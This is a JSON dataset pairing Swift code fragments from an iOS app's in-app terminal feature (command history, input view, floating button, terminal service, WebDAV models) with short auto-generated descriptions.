    "nl": "Function resetIndex - implements resetindex functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3386",
    "code": "func clearHistory() {\nlogger.log(message: \"Clearing command history\", type: .info)\ncommands.removeAll()\ncurrentIndex = -1\n}\n\n/// Save command history to UserDefaults\nfunc saveHistory() {",
    "nl": "Function clearHistory - implements clearhistory functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3387",
    "code": "func saveHistory() {\nUserDefaults.commandHistory = commands\nlogger.log(message: \"Saved \\(commands.count) commands to history\", type: .info)\n}\n\n/// Load command history from UserDefaults\nfunc loadHistory() {",
    "nl": "/ Save command history to UserDefaults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3388",
    "code": "func loadHistory() {\nif let savedCommands = UserDefaults.commandHistory {",
    "nl": "/ Load command history from UserDefaults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "function"
  },
  {
    "id": "3389",
    "code": "extension UserDefaults {\n// Using regular UserDefaults instead of generic Storage to avoid static property in generic type error\nstatic var commandHistory: [String]? {",
    "nl": "Add storage extension for command history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandHistory.swift",
    "code_type": "extension"
  },
  {
    "id": "3390",
    "code": "class CommandInputView: UITextField {\nprivate let padding = UIEdgeInsets(top: 0, left: 10, bottom: 0, right: 10)\n\noverride init(frame: CGRect) {",
    "nl": "class CommandInputView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "class"
  },
  {
    "id": "3391",
    "code": "private func setupTextField() {\nbackgroundColor = UIColor(named: \"SettingsCell\") ?? UIColor.darkGray\ntextColor = UIColor.label\ntintColor = UIColor.systemBlue // Cursor color\nfont = UIFont.monospacedSystemFont(ofSize: 14, weight: .regular)\nlayer.borderColor = UIColor.gray.cgColor\nlayer.borderWidth = 1.0\nreturnKeyType = .send\nautocorrectionType = .no\nautocapitalizationType = .none",
    "nl": "Function setupTextField - sets uptextfield",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3392",
    "code": "override func textRect(forBounds bounds: CGRect) -> CGRect {\nreturn bounds.inset(by: padding)\n}\n\noverride func editingRect(forBounds bounds: CGRect) -> CGRect {",
    "nl": "Function textRect - implements textrect functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3393",
    "code": "override func editingRect(forBounds bounds: CGRect) -> CGRect {\nreturn bounds.inset(by: padding)\n}\n\noverride func placeholderRect(forBounds bounds: CGRect) -> CGRect {",
    "nl": "Function editingRect - implements editingrect functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3394",
    "code": "override func placeholderRect(forBounds bounds: CGRect) -> CGRect {\nreturn bounds.inset(by: padding)\n}\n\noverride func clearButtonRect(forBounds bounds: CGRect) -> CGRect {",
    "nl": "Function placeholderRect - implements placeholderrect functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3395",
    "code": "override func clearButtonRect(forBounds bounds: CGRect) -> CGRect {\nlet originalRect = super.clearButtonRect(forBounds: bounds)\nreturn originalRect.offsetBy(dx: -padding.right / 2, dy: 0)\n}\n\n// Handle dark/light mode changes\noverride func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {",
    "nl": "Function clearButtonRect - implements clearbuttonrect functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3396",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Handle dark/light mode changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/CommandInputView.swift",
    "code_type": "function"
  },
  {
    "id": "3397",
    "code": "class FloatingTerminalButton: UIButton {\n// Default position values\nprivate let defaultPosition = CGPoint(x: 60, y: 500)\nprivate let cornerRadius: CGFloat = 25\nprivate let buttonSize: CGFloat = 50\n\n// Accessibility properties\nprivate let accessibilityEdgeMargin: CGFloat = 20\nprivate let minimumTouchArea: CGFloat = 60\n",
    "nl": "/ Floating button that provides quick access to the terminal",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "class"
  },
  {
    "id": "3398",
    "code": "private func setupButton() {\n// Configure button appearance\nframe = CGRect(x: 0, y: 0, width: buttonSize, height: buttonSize)\nlayer.cornerRadius = cornerRadius\n\n// Shadow for better visibility\nlayer.shadowColor = UIColor.black.cgColor\nlayer.shadowOffset = CGSize(width: 0, height: 2)\nlayer.shadowOpacity = 0.3\nlayer.shadowRadius = 4",
    "nl": "Function setupButton - sets upbutton",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3399",
    "code": "private func setupAccessibility() {\n// Set accessibility traits\naccessibilityTraits = .button\n\n// Set accessibility label and hint\naccessibilityLabel = \"Terminal\"\naccessibilityHint = \"Double tap to open terminal. Drag to move button.\"\n\n// Make sure it's accessible\nisAccessibilityElement = true",
    "nl": "Function setupAccessibility - sets upaccessibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3400",
    "code": "private func setupGestures() {\n// Pan gesture for dragging\npanGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:)))\npanGesture.minimumNumberOfTouches = 1\npanGesture.maximumNumberOfTouches = 1\naddGestureRecognizer(panGesture)\n}\n\n@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {",
    "nl": "Function setupGestures - sets upgestures",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3401",
    "code": "@objc private func handlePan(_ gesture: UIPanGestureRecognizer) {\nguard let superview = superview else { return }",
    "nl": "Function handlePan - implements handlepan functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3402",
    "code": "private func savePosition() {\nUserDefaults.standard.set(center.x, forKey: positionXKey)\nUserDefaults.standard.set(center.y, forKey: positionYKey)\n}\n\nprivate func restorePosition() {",
    "nl": "Function savePosition - implements saveposition functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3403",
    "code": "private func restorePosition() {\n// Get saved position, or use default\nlet x = UserDefaults.standard.double(forKey: positionXKey)\nlet y = UserDefaults.standard.double(forKey: positionYKey)\n\nif x > 0 && y > 0 {",
    "nl": "Function restorePosition - implements restoreposition functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3404",
    "code": "private func ensureAccessiblePosition() {\nguard let superview = superview else { return }",
    "nl": "/ Ensures the button is in an accessible position within the screen bounds",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3405",
    "code": "func updateAppearance() {\n// Get current trait collection\nlet interfaceStyle = UIScreen.main.traitCollection.userInterfaceStyle\n\nif interfaceStyle == .dark {",
    "nl": "/ Update button appearance based on system theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3406",
    "code": "@objc private func buttonTapped() {\n// Provide haptic feedback\nlet generator = UIImpactFeedbackGenerator(style: .medium)\ngenerator.impactOccurred()\n\n// Post notification to launch terminal\nNotificationCenter.default.post(name: .showTerminal, object: nil)\n\nlogger.log(message: \"Floating terminal button tapped\", type: .info)\n}",
    "nl": "Function buttonTapped - implements buttontapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3407",
    "code": "override func didMoveToSuperview() {\nsuper.didMoveToSuperview()\n\n// Restore position when added to view\nif superview != nil {",
    "nl": "Function didMoveToSuperview - implements didmovetosuperview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3408",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\n// Update appearance when theme changes\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3409",
    "code": "override func point(inside point: CGPoint, with event: UIEvent?) -> Bool {\n// Expand touch area for better accessibility\nlet expandedBounds = bounds.insetBy(dx: -15, dy: -15)\nreturn expandedBounds.contains(point)\n}\n\n// Handle layout changes\noverride func layoutSubviews() {",
    "nl": "Override point inside to increase touch area",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3410",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\n\n// Ensure button is in accessible position after layout changes\nDispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { [weak self] in",
    "nl": "Handle layout changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "function"
  },
  {
    "id": "3411",
    "code": "extension Notification.Name {\nstatic let showTerminal = Notification.Name(\"showTerminal\")\nstatic let showTerminalButton = Notification.Name(\"showTerminalButton\")\nstatic let hideTerminalButton = Notification.Name(\"hideTerminalButton\")\n}\n",
    "nl": "Add notification names for terminal button control",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/FloatingTerminalButton.swift",
    "code_type": "extension"
  },
  {
    "id": "3412",
    "code": "class TerminalTextView: UITextView {\n// Terminal color theme\nstruct TerminalTheme {",
    "nl": "class TerminalTextView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "class"
  },
  {
    "id": "3413",
    "code": "struct TerminalTheme {\nlet background: UIColor\nlet text: UIColor\nlet userInput: UIColor\nlet systemOutput: UIColor\nlet errorOutput: UIColor\n}\n\n// Default dark theme\nprivate var darkTheme = TerminalTheme(",
    "nl": "Terminal color theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "struct"
  },
  {
    "id": "3414",
    "code": "private func setupTextView() {\n// Apply theme\nupdateTheme()\n\n// Configure text view properties\nfont = UIFont.monospacedSystemFont(ofSize: 14, weight: .regular)\nisEditable = false\nisSelectable = true\nautocorrectionType = .no\nautocapitalizationType = .none",
    "nl": "Function setupTextView - sets uptextview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "function"
  },
  {
    "id": "3415",
    "code": "private func setupCustomMenu() {\nlet menuController = UIMenuController.shared\nmenuController.menuItems = [\nUIMenuItem(title: \"Copy\", action: #selector(copy(_:))),\nUIMenuItem(title: \"Select All\", action: #selector(selectAll(_:))),\n]\n}\n\nprivate func updateTheme() {",
    "nl": "Function setupCustomMenu - sets upcustommenu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "function"
  },
  {
    "id": "3416",
    "code": "private func updateTheme() {\nbackgroundColor = currentTheme.background\ntextColor = currentTheme.text\n}\n\n@objc private func userInterfaceStyleDidChange() {",
    "nl": "Function updateTheme - updates theme",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "function"
  },
  {
    "id": "3417",
    "code": "@objc private func userInterfaceStyleDidChange() {\nupdateTheme()\n}\n\n// Custom handling for text selection\noverride func canPerformAction(_ action: Selector, withSender _: Any?) -> Bool {",
    "nl": "Function userInterfaceStyleDidChange - implements userinterfacestyledidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "function"
  },
  {
    "id": "3418",
    "code": "override func canPerformAction(_ action: Selector, withSender _: Any?) -> Bool {\nif action == #selector(copy(_:)) || action == #selector(selectAll(_:)) {",
    "nl": "Custom handling for text selection",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "function"
  },
  {
    "id": "3419",
    "code": "extension NSNotification.Name {\nstatic let didChangeUserInterfaceStyle = NSNotification.Name(\"didChangeUserInterfaceStyle\")\n}\n",
    "nl": "Create notification for interface style changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift",
    "code_type": "extension"
  },
  {
    "id": "3420",
    "code": "enum TerminalError: Error {\ncase invalidURL\ncase networkError(String)\ncase responseError(String)\ncase sessionError(String)\ncase parseError(String)\ncase executionError(String)\ncase localError(String)\n}\n",
    "nl": "enum TerminalError - implements functionality related to terminal error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "enum"
  },
  {
    "id": "3421",
    "code": "class TerminalService {\nstatic let shared = TerminalService()\n\nprivate var sessionId: String?\nprivate let logger = Debug.shared\n\n// Local service for on-device execution\nprivate let localService = LocalTerminalService.shared\n\n// Output handlers",
    "nl": "/ TerminalService - Provides terminal functionality / This is an updated version that uses a local implementation instead of a web server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "class"
  },
  {
    "id": "3422",
    "code": "func createSession(completion: @escaping (TerminalResult<String>) -> Void) {\nlogger.log(message: \"Creating new terminal session\", type: .info)\n\nlocalService.createSession { result in",
    "nl": "MARK: - Session Management / Creates a new terminal session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3423",
    "code": "func executeCommand(\n_ command: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (TerminalResult<Void>) -> Void\n) {",
    "nl": "/ Executes a command in the current session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3424",
    "code": "private func executeCommandInSession(\n_ command: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (TerminalResult<Void>) -> Void\n) {",
    "nl": "/ Executes a command in a specific session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3425",
    "code": "func sendInput(\n_ input: String,\ncompletion: @escaping (TerminalResult<Void>) -> Void\n) {",
    "nl": "/ Sends input to a running process",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3426",
    "code": "func terminateSession(completion: @escaping (TerminalResult<Void>) -> Void) {\nguard let sessionId = sessionId else {",
    "nl": "/ Terminates the current session",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3427",
    "code": "func resizeSession(cols: Int, rows: Int, completion: @escaping (TerminalResult<Void>) -> Void) {\n// Local implementation doesn't need explicit resizing\ncompletion(.success(()))\n}\n\n/// Alias for terminateSession to maintain backward compatibility\nfunc endSession(completion: @escaping (TerminalResult<Void>) -> Void) {",
    "nl": "/ Resizes the terminal session (placeholder for compatibility) / Local implementation doesn't need resizing but we keep the method for API compatibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3428",
    "code": "func endSession(completion: @escaping (TerminalResult<Void>) -> Void) {\nterminateSession(completion: completion)\n}\n}\n\n// Legacy wrapper class for compatibility\nclass ProcessUtility {",
    "nl": "/ Alias for terminateSession to maintain backward compatibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3429",
    "code": "class ProcessUtility {\nstatic let shared = ProcessUtility()\nprivate let logger = Debug.shared\n\nprivate init() {}",
    "nl": "Legacy wrapper class for compatibility",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "class"
  },
  {
    "id": "3430",
    "code": "func executeShellCommand(_ command: String, completion: @escaping (String?) -> Void) {\nvar output = \"\"\n\nlogger.log(message: \"ProcessUtility executing command: \\(command)\", type: .info)\n\nTerminalService.shared.executeCommand(command, outputHandler: { newOutput in",
    "nl": "/ Executes a shell command and returns the output. / - Parameters: /   - command: The shell command to be executed. /   - completion: A closure to be called with the command's output or an error message.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3431",
    "code": "func executeShellCommandWithStreaming(\n_ command: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (String?) -> Void\n) {",
    "nl": "/ Executes a shell command with real-time output streaming. / - Parameters: /   - command: The shell command to be executed. /   - outputHandler: Real-time handler for command output chunks. /   - completion: A closure to be called when the command completes.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "3432",
    "code": "struct WebDAVCredentials: Codable {\nlet url: String\nlet username: String\nlet password: String\nlet protocolType: String\n\nenum CodingKeys: String, CodingKey {",
    "nl": "MARK: - WebDAV Models",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3433",
    "code": "enum CodingKeys: String, CodingKey {\ncase url\ncase username\ncase password\ncase protocolType = \"protocol\"\n}\n}\n\nstruct WebDAVResponse: Codable {",
    "nl": "enum CodingKeys - implements functionality related to coding keys",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3434",
    "code": "struct WebDAVResponse: Codable {\nlet credentials: WebDAVCredentials\nlet instructions: [String]\nlet clients: WebDAVClients?\n}\n\nstruct WebDAVClients: Codable {",
    "nl": "struct WebDAVResponse - implements functionality related to web d a v response",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3435",
    "code": "struct WebDAVClients: Codable {\nlet ios: [String]?\nlet macos: [String]?\nlet windows: [String]?\nlet android: [String]?\n}\n\nclass TerminalViewController: UIViewController {",
    "nl": "struct WebDAVClients - implements functionality related to web d a v clients",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3436",
    "code": "class TerminalViewController: UIViewController {\n// MARK: - UI Components\n\nprivate let terminalOutputTextView = TerminalTextView()\nprivate let commandInputView = CommandInputView()\nprivate let activityIndicator = UIActivityIndicatorView(style: .medium)\nprivate let toolbar = UIToolbar()\nprivate let connectionStatusView = UIView()\n\n// MARK: - Properties",
    "nl": "class TerminalViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3437",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nsetupConstraints()\nsetupKeyboardNotifications()\nsetupActions()\n\n// Load user preferences\nloadUserPreferences()\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3438",
    "code": "private func loadUserPreferences() {\n// Load WebSocket preference from UserDefaults\nif UserDefaults.standard.object(forKey: \"terminal_websocket_enabled\") != nil {",
    "nl": "Function loadUserPreferences - implements loaduserpreferences functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3439",
    "code": "private func saveUserPreferences() {\n// Save WebSocket preference to UserDefaults\nUserDefaults.standard.set(userPreferenceWebSockets, forKey: \"terminal_websocket_enabled\")\n}\n\nprivate func setupConnectionStatusTimer() {",
    "nl": "Function saveUserPreferences - implements saveuserpreferences functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3440",
    "code": "private func setupConnectionStatusTimer() {\n// Update connection status every 3 seconds\nTimer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { [weak self] _ in",
    "nl": "Function setupConnectionStatusTimer - sets upconnectionstatustimer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3441",
    "code": "private func updateTitle() {\n// Update navigation title to include connection mode\nif isWebSocketConnected {",
    "nl": "Function updateTitle - updates title",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3442",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\ncommandInputView.becomeFirstResponder()\n}\n\noverride func viewWillDisappear(_ animated: Bool) {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3443",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n// Save command history when leaving view\nhistory.saveHistory()\n}\n\noverride func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3444",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3445",
    "code": "private func setupUI() {\nview.backgroundColor = UIColor(named: \"Background\") ?? UIColor.systemBackground\n\n// Set navigation bar title and style\ntitle = \"Terminal\"\nnavigationItem.largeTitleDisplayMode = .never\n\n// Add a close button if presented modally\nif presentingViewController != nil {",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3446",
    "code": "private func updateConnectionStatus() {\n// Check if local terminal service is active\nisWebSocketConnected = TerminalService.shared.isWebSocketActive\n\n// Update connection status indicator - always green for local implementation\nconnectionStatusView.backgroundColor = .systemGreen\n\n// Update title to show local mode\ntitle = \"Terminal [Local]\"\n",
    "nl": "Function updateConnectionStatus - updates connectionstatus",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3447",
    "code": "@objc private func showLanguageHelp() {\n// Display help about the custom programming language\nappendToTerminal(\"\\n\", isInput: false)\n\nlet helpText = \"\"\"\nBackdoor Custom Programming Language\n===================================\n\nThe custom language supports both Swift and Python execution with\nseamless interoperability between them.",
    "nl": "Function showLanguageHelp - implements showlanguagehelp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3448",
    "code": "private func setupToolbar() {\nlet flexSpace = UIBarButtonItem(barButtonSystemItem: .flexibleSpace, target: nil, action: nil)\n\nlet clearButton = UIBarButtonItem(\nimage: UIImage(systemName: \"trash\"),\nstyle: .plain,\ntarget: self,\naction: #selector(clearTerminal)\n)\nclearButton.accessibilityLabel = \"Clear Terminal\"",
    "nl": "Function setupToolbar - sets uptoolbar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3449",
    "code": "private func updateToolbarButtons() {\n// No WebSocket status to update - always in local mode\n}\n\nprivate func setupConstraints() {",
    "nl": "Function updateToolbarButtons - updates toolbarbuttons",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3450",
    "code": "private func setupConstraints() {\nterminalOutputTextView.translatesAutoresizingMaskIntoConstraints = false\ncommandInputView.translatesAutoresizingMaskIntoConstraints = false\nactivityIndicator.translatesAutoresizingMaskIntoConstraints = false\nconnectionStatusView.translatesAutoresizingMaskIntoConstraints = false\n\nNSLayoutConstraint.activate([\n// Terminal output\nterminalOutputTextView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),\nterminalOutputTextView.leadingAnchor.constraint(equalTo: view.leadingAnchor),",
